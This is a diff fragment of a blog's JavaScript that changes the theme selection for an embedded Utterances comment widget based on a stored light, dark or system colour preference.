 function openComments(){
     cm=document.getElementById("comments");
@@ -249,8 +500,11 @@ function openComments(){
     script.setAttribute("src","https://utteranc.es/client.js");
     script.setAttribute("repo","fish123123/fish123123.github.io");
     script.setAttribute("issue-term","title");
+    
     if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
-    else{script.setAttribute("theme","github-light");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
     script.setAttribute("crossorigin","anonymous");
     script.setAttribute("async","");
     cm.appendChild(script);
@@ -269,9 +523,7 @@ function iFrameLoading(){
         }
     }
 }
-
 </script>
-
 
 
 
